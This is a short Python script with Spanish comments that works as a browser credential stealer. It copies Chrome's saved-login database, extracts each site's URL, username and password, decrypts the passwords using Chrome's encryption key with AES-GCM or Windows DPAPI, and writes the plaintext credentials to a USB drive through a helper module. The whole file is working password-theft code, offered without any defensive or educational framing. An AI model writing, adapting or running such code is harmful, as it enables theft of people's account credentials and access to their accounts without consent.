import os
import shutil
import sqlite3

import win32crypt  # Solo disponible en Windows
from Crypto.Cipher import AES
import mi_usb
import mi_chrome


def decrypt_password(encrypted_password, key):
    password = encrypted_password[15:-16]

    try:
        # Saltamos los primeros 3 bytes, luego obtenemos el nonce (12 bytes)
        nonce = encrypted_password[3:15]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

        # Desencriptar la contraseña usando el cifrado AES-GCM
        return cipher.decrypt(password).decode("utf-8")

    except (IndexError, ValueError, TypeError, UnicodeDecodeError, KeyError) as e:
        print(f"Error durante la desencriptación AES: {e}")

        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]

        except (AttributeError, TypeError, Exception) as e:
            print(f"Error durante la desencriptación con win32crypt: {e}")

            return ""


def main():
    key = mi_chrome.get_chrome_encryption_key()

    db_path = os.path.expanduser(
        os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default",
                     "Login Data")
    )

    temp_db_path = "ChromeData.db"
    shutil.copyfile(db_path, temp_db_path)
    db = sqlite3.connect(temp_db_path)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins ORDER BY date_created")

    contenido = ""
    for row in cursor.fetchall():
        ## origin_url
        contenido += row[0] + "\n"

        ## action_url
        contenido += row[1] + "\n"

        ## username_value
        contenido += row[2] + "\n"

        ## password_value
        contenido += decrypt_password(row[3], key) + "\n"
        contenido += "-" * 50 + "\n"

    mi_usb.guardar_en_usb(contenido=contenido)
    cursor.close()
    db.close()

    os.remove(temp_db_path)


if __name__ == '__main__':
    main()
